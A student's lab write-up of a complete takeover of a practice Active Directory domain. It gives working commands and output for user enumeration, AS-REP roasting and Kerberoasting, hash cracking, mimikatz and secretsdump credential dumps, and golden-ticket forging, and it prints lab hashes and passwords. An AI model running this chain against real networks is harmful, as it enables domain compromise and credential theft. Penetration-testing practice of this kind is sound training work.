**By: Joshua Payne**

We are given the SRV02 IP of 10.39.139.22

First ran SMB to enumerate:
```
nxc smb 10.39.139.0/24
SMB         10.39.139.11    445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:>
SMB         10.39.139.22    445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv>
SMB         10.39.139.10    445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:None>
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Giving us the IPs
```
10.39.139.11 WINTERFELL
10.39.139.22 CASTELBLACK (SRV02)
10.39.139.10 KINGSLANDING
```

I then ran 
```
smbclient -N -L //10.39.139.22
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	all             Disk      Basic RW share for all
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	public          Disk      Basic Read share for all domain users
SMB1 disabled -- no workgroup available
```

Giving us the shares and proving Null Sessions are available, I then tried to enumerate users with null sessions on each host
```
  nxc smb 10.39.139.22 -u "" -p "" --users
SMB         10.39.139.22    445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:None)
SMB         10.39.139.22    445    CASTELBLACK      [-] north.sevenkingdoms.local\: STATUS_ACCESS_DENIED 
  nxc smb 10.39.139.10 -u "" -p "" --users
SMB         10.39.139.10    445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.39.139.10    445    KINGSLANDING     [+] sevenkingdoms.local\: 
  nxc smb 10.39.139.11 -u "" -p "" --users
SMB         10.39.139.11    445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.39.139.11    445    WINTERFELL       [+] north.sevenkingdoms.local\: 
SMB         10.39.139.11    445    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-    
SMB         10.39.139.11    445    WINTERFELL       Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.39.139.11    445    WINTERFELL       arya.stark                    2026-05-03 22:45:09 0       Arya Stark 
SMB         10.39.139.11    445    WINTERFELL       sansa.stark                   2026-05-03 22:45:39 0       Sansa Stark 
SMB         10.39.139.11    445    WINTERFELL       brandon.stark                 2026-05-03 22:45:51 0       Brandon Stark 
SMB         10.39.139.11    445    WINTERFELL       rickon.stark                  2026-05-03 22:45:54 0       Rickon Stark 
SMB         10.39.139.11    445    WINTERFELL       hodor                         2026-05-03 22:46:01 0       Brainless Giant 
SMB         10.39.139.11    445    WINTERFELL       jon.snow                      2026-05-03 22:46:09 0       Jon Snow 
SMB         10.39.139.11    445    WINTERFELL       samwell.tarly                 2026-05-03 22:46:16 0       Samwell Tarly (Password : Heartsbane)
SMB         10.39.139.11    445    WINTERFELL       jeor.mormont                  2026-05-03 22:46:21 0       Jeor Mormont 
SMB         10.39.139.11    445    WINTERFELL       sql_svc                       2026-05-03 22:46:24 0       sql service 
SMB         10.39.139.11    445    WINTERFELL       [*] Enumerated 10 local users: NORTH
```

This gave us all the local users on **10.39.139.11** and a set of credentials:
```
samwell.tarly:Heartsbane
```

Used that to enumerate shares on SRV02
```
nxc smb 10.39.139.22 -u "samwell.tarly" -p "Heartsbane" --shares
SMB         10.39.139.22    445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:None)
SMB         10.39.139.22    445    CASTELBLACK      [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
SMB         10.39.139.22    445    CASTELBLACK      [*] Enumerated shares
SMB         10.39.139.22    445    CASTELBLACK      Share           Permissions     Remark
SMB         10.39.139.22    445    CASTELBLACK      -----           -----------     ------
SMB         10.39.139.22    445    CASTELBLACK      ADMIN$                          Remote Admin
SMB         10.39.139.22    445    CASTELBLACK      all             READ,WRITE      Basic RW share for all
SMB         10.39.139.22    445    CASTELBLACK      C$                              Default share
SMB         10.39.139.22    445    CASTELBLACK      IPC$            READ            Remote IPC
SMB         10.39.139.22    445    CASTELBLACK      public          READ,WRITE      Basic Read share for all domain users
```

I first went into the **all** share and found:
```
smbclient -U "samwell.tarly" //10.39.139.22/all
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\samwell.tarly]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 10 07:16:46 2026
  ..                                  D        0  Sun May 10 07:16:46 2026
  arya.txt                            A      413  Sun May  3 16:08:36 2026
```

So I used ```get arya.txt``` and then ```cat arya.txt``` once I exited the smb.
```
Subject: Quick Departure

Hey Arya,

I hope this message finds you well. Something urgent has come up, and I have to leave for a while. Don't worry; I'll be back soon.

I left a little surprise for you in your room – the sword You've named "Needle." It felt fitting, given your skills. Take care of it, and it'll take care of you.

I'll explain everything when I return. Until then, stay sharp, sis.

Best,
John             
```

We try and see if Arya's password is "Needle." utilizing the nxc smb technique as before, and the credentials dont work.

We then move on to AS-REP Roasting to see if we can find anymore credentials.
```
GetNPUsers.py NORTH.SEVENKINGDOMS.LOCAL/ -usersfile ~/Desktop/College/480/users.txt -no-pass -dc-ip 10.39.139.11
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:f752448995ec7fea3fdeab4c37e08ede$bfc0130594546d2e9add8a40dd6fa51082593bc29bf43a709fb3dae04426aed15fb37901975d4effec81e8d2b4ccc8d0efacd47a9e2c2aa89ceb2087b5764f71bb0ead255db78a974c9e67641ab71ec0e53d432fdc5b699426909f43dbea867c2838642c00a7f6c332a24b032b990e1a5a19b4a8da9574730702a0cdb5ebab7208711e863b53129307ab62e750cac13dbf99042ea84b0978c879d40bcf2e319c61f21f5bd381158f684c54cf521a0efee4b7b54c5e412464f230ad2a692c493c06ab29df82de216c8e1cb13e4dcc0f1fca7a73f9db2c415a3db5be70e48600087427856ede44920edf1e2619e306cc8f22b91af70ffb54012bb940f589d39477dfbd1cb16910
```

We get a AS-REP Hash that we can try to crack in hashcat. First we need to find the mode.
```
hashcat --identify hashes.txt
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

Then we use this command:
```
hashcat -m 18200 hashes.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

To get the password of: ```iseedeadpeople```

I then try to use his login for xfreerdp
```
xfreerdp /v:10.39.139.22 /u:brandon.stark /p:iseedeadpeople /cert-ignore /drive:linux,/home/josh/tools/windows
```
The extra stuff such as /drive:linux is there to point to my tools that I can easily transfer over to the host. The login was successful

We transfer Rubeus.exe to the desktop to see if there are any kerberoastable users. In powershell we run:
```
PS C:\Users\brandon.stark\Desktop> .\Rubeus.exe kerberoast /nowrap 
```

We get 3 kerberoastable users back
```
sansa.stark
jon.snow
sql_svc
```

We tried to run the 3 hashes through hashcat:
```
hashcat --identify hash.tgs
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol

hashcat -m 13100 hash.tgs /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

And ended up only getting the credentials back for **jon.snow**
```
iknownothing
```

We enumerate jon.snow back against nxc smb and see that he has READ to NETLOGON
```
nxc smb 10.39.139.10 -u "jon.snow" -p "iknownothing" --shares
SMB         10.39.139.10    445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.39.139.10    445    KINGSLANDING     [-] sevenkingdoms.local\jon.snow:iknownothing STATUS_LOGON_FAILURE 
  nxc smb 10.39.139.11 -u "jon.snow" -p "iknownothing" --shares
SMB         10.39.139.11    445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.39.139.11    445    WINTERFELL       [+] north.sevenkingdoms.local\jon.snow:iknownothing 
SMB         10.39.139.11    445    WINTERFELL       [*] Enumerated shares
SMB         10.39.139.11    445    WINTERFELL       Share           Permissions     Remark
SMB         10.39.139.11    445    WINTERFELL       -----           -----------     ------
SMB         10.39.139.11    445    WINTERFELL       ADMIN$                          Remote Admin
SMB         10.39.139.11    445    WINTERFELL       C$                              Default share
SMB         10.39.139.11    445    WINTERFELL       IPC$            READ            Remote IPC
SMB         10.39.139.11    445    WINTERFELL       NETLOGON        READ            Logon server share 
SMB         10.39.139.11    445    WINTERFELL       SYSVOL          READ            Logon server share 
```

We then login and see if theres anything
```
smbclient -U "jon.snow" //10.39.139.11/NETLOGON
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\jon.snow]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May  3 16:08:38 2026
  ..                                  D        0  Sun May  3 16:08:38 2026
  script.ps1                          A      165  Sun May  3 16:08:35 2026
  secret.ps1                          A      869  Sun May  3 16:08:37 2026

		10485247 blocks of size 4096. 6501675 blocks available

smb: \> get script.ps1
getting file \script.ps1 of size 165 as script.ps1 (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \> get secret.ps1
getting file \secret.ps1 of size 869 as secret.ps1 (3.8 KiloBytes/sec) (average 2.3 KiloBytes/sec)
smb: \> exit
  cat script.ps1
# fake script in netlogon with creds
$task = '/c TODO'
$taskName = "fake task"
$user = "NORTH\jeor.mormont"
$password = "_L0ngCl@w_"

# passwords in sysvol still ...⏎                                                                                                 cat secret.ps1
# cypher script
# $domain="sevenkingdoms.local"
# $EncryptionKeyBytes = New-Object Byte[] 32
# [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($EncryptionKeyBytes)
# $EncryptionKeyBytes | Out-File "encryption.key"
# $EncryptionKeyData = Get-Content "encryption.key"
# Read-Host -AsSecureString | ConvertFrom-SecureString -Key $EncryptionKeyData | Out-File -FilePath "secret.encrypted"

# secret stored :
$keyData = 177, 252, 228, 64, 28, 91, 12, 201, 20, 91, 21, 139, 255, 65, 9, 247, 41, 55, 164, 28, 75, 132, 143, 71, 62, 191, 211, 61, 154, 61, 216, 91
$secret="76492d1116743f0423413b16050a5345MgB8AGkAcwBDACsAUwArADIAcABRAEcARABnAGYAMwA3AEEAcgBFAEIAYQB2AEEAPQA9AHwAZQAwADgANAA2ADQAMABiADYANAAwADYANgA1ADcANgAxAGIAMQBhAGQANQBlAGYAYQBiADQAYQA2ADkAZgBlAGQAMQAzADAANQAyADUAMgAyADYANAA3ADAAZABiAGEAOAA0AGUAOQBkAGMAZABmAGEANAAyADkAZgAyADIAMwA="

# T.L.⏎ 
```

We find the credentials for jeor.mormont so we go back through and enumerate again and find:
```
nxc smb 10.39.139.22 -u "jeor.mormont" -p "_L0ngCl@w_" --shares
SMB         10.39.139.22    445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:None)
SMB         10.39.139.22    445    CASTELBLACK      [+] north.sevenkingdoms.local\jeor.mormont:_L0ngCl@w_ (Pwn3d!)
SMB         10.39.139.22    445    CASTELBLACK      [*] Enumerated shares
SMB         10.39.139.22    445    CASTELBLACK      Share           Permissions     Remark
SMB         10.39.139.22    445    CASTELBLACK      -----           -----------     ------
SMB         10.39.139.22    445    CASTELBLACK      ADMIN$          READ,WRITE      Remote Admin
SMB         10.39.139.22    445    CASTELBLACK      all             READ,WRITE      Basic RW share for all
SMB         10.39.139.22    445    CASTELBLACK      C$              READ,WRITE      Default share
SMB         10.39.139.22    445    CASTELBLACK      IPC$            READ            Remote IPC
SMB         10.39.139.22    445    CASTELBLACK      public          READ,WRITE      Basic Read share for all domain users
```

We see we have admin access to CASTELBLACK therefore, we login and use mimikatz
First, we transfer it to the desktop, then use .\mimikatz.exe then the following commands:
```
privilege::debug
log mimi.txt
token::elevate

sekurlsa::logonpasswords
```

We look in the dumped file on the desktop and search for the members we dont have the credentials for yet and find the NTLM hash for **rob.stark** and **sql_svc** 
```
rob.stark:831486ac7f26860c9e2f51ac91e1a07a 
sql_svc:84a5092f53390ea48d660be52b93b804
```

While we are admin, we go ahead and run SharpHound.exe to use with Bloodhound and get a visual depiction of the domain.

We transfer SharpHound.exe to the desktop and use .\SharpHound.exe and it gives us a zip file to upload into Bloodhound.

We upload it into BloodHound-CE and first see who the Domain Admins are and see this after running the "All Domain Admins Query"

![[Pasted image 20260510181513.png]]

Which gives us the Domain Admin **eddard.stark** so lets see who has permissions to him.
Under Inbound Object Control we see:
![[Pasted image 20260510181846.png]]

Importantly we see robb.stark who we just got the NTLM Hash for

![[Pasted image 20260510181247.png]]

So we now go ahead and try to crack that NTLM Hash with hashcat

We put both NTLM hashes we found for **svc_sql** and **robb.stark** into a file and run 
```
hashcat -m 1000 hash.ntlm /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

We only crack 1/2 and it ends up being robb.stark's with the password of:
```
sexywolfy
```

So we know we now have one of the Local Administrators with access to the Domain Admin.

Therefore, I ran:
```
secretsdump.py north.sevenkingdoms.local/robb.stark:sexywolfy@10.39.139.11
```

Giving us some more NTLM hashes
```
rickon.stark:7978dc8a66d8e480d9a86041f8409560
catelyn.stark:cba36eccfd9d949c73bc73715364aff5
eddard.stark:d977b98c6c9282c5c478be1d97b237b8
hodor:337d2667505c203904bd899c6c95525e
arya.stark:4f622f4cd4284a887228940e2ff4e709

krbtgt:a72f64e7844c2bdd0b657b141a03f82e
```

I tried to crack all of them with hashcat and crackstation, however only got 3 passwords
```
hodor:hodor
arya.stark:Needle
sansa.stark:345ertdfg
```

But the important thing we found was the krbtgt which we also got its AES-Key:
```
da3c694168b60cf846d7e79edd6702b2b557ed44f0ed7eab919f00c3ef357573
```

We can now try to grab a golden ticket with first getting some sid:
```
lookupsid.py 'north.sevenkingdoms.local/eddard.stark'@10.39.139.11 -hashes :d977b98c6c9282c5c478be1d97b237b8 0 | grep -i "Domain SID"     
    lookupsid.py 'north.sevenkingdoms.local/eddard.stark'@10.39.139.10 -hashes :d977b98c6c9282c5c478be1d97b237b8 0 | grep -i "Domain SID"
[*] Domain SID is: S-1-5-21-3344462828-1211246890-2296626790
[*] Domain SID is: S-1-5-21-3176913123-3677525926-1477184898
  ticketer.py -aesKey da3c694168b60cf846d7e79edd6702b2b557ed44f0ed7eab919f00c3ef357573 -domain-sid S-1-5-21-3344462828-1211246890-2296626790 -domain north.sevenkingdoms.local -extra-sid S-1-5-21-3176913123-3677525926-1477184898-519 Administrator
```

Then we set it (Or Export)
```
set -x KRB5CCNAME (pwd)/Administrator.ccache
```

And then we utilize secretsdump and dump the Enterprise Admin:
```
secretsdump.py -k -no-pass 'north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local' -just-dc-user 'sevenkingdoms/Administrator'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:797041b902bc1642d6b320b872dc45795a0b3a8d18ac805a1426091724758a7c
Administrator:aes128-cts-hmac-sha1-96:b5b190614c41a263d6d71aef388cbf2b
Administrator:des-cbc-md5:b510c77f988a4ab6
[*] Cleaning up... 
```

We confirm with:
```
nxc smb 10.39.139.10 -d sevenkingdoms.local -u Administrator -H c66d72021a2d4744409969a581a1705e --users
SMB         10.39.139.10    445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.39.139.10    445    KINGSLANDING     [+] sevenkingdoms.local\Administrator:c66d72021a2d4744409969a581a1705e (Pwn3d!)
```

We have successfully taken over the network, now for fun, we can try to see if we can get the passwords easily for any other accounts:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3433f7eabf2a94cc6e73212d1d227be5:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:4659e8b8e5a7bc47c6047721704b8f1c:::
tywin.lannister:1112:aad3b435b51404eeaad3b435b51404ee:af52e9ec3471788111a6308abff2e9b7:::
jaime.lannister:1113:aad3b435b51404eeaad3b435b51404ee:71f443522b6ff798412684f2ad0e1cad:::
cersei.lannister:1114:aad3b435b51404eeaad3b435b51404ee:c247f62516b53893c7addcf8c349954b:::
tyron.lannister:1115:aad3b435b51404eeaad3b435b51404ee:6d15ee8890a96e9da8de339639b12ec0:::
robert.baratheon:1116:aad3b435b51404eeaad3b435b51404ee:9029cf007326107eb1c519c84ea60dbe:::
joffrey.baratheon:1117:aad3b435b51404eeaad3b435b51404ee:3b60abbc25770511334b3829866b08f1:::
renly.baratheon:1118:aad3b435b51404eeaad3b435b51404ee:1e9ed4fc99088768eed631acfcd49bce:::
stannis.baratheon:1119:aad3b435b51404eeaad3b435b51404ee:6d15ee8890a96e9da8de339639b12ec0:::
petyer.baelish:1120:aad3b435b51404eeaad3b435b51404ee:6c439acfa121a821552568b086c8d210:::
lord.varys:1121:aad3b435b51404eeaad3b435b51404ee:52ff2a79823d81d6a3f4f8261d7acc59:::
maester.pycelle:1122:aad3b435b51404eeaad3b435b51404ee:9a2a96fa3ba6564e755e8d455c007952:::
```

We got these passwords back from crackstation.net
```
cersei.lanister:il0vejaime (Domain Admin)
robert.baratheon:iamthekingoftheworld (Domain Admin)
joffrey.baratheon:1killerlion
renly.baratheon:lorastyrell
petyr.baelish:@littlefinger@
```

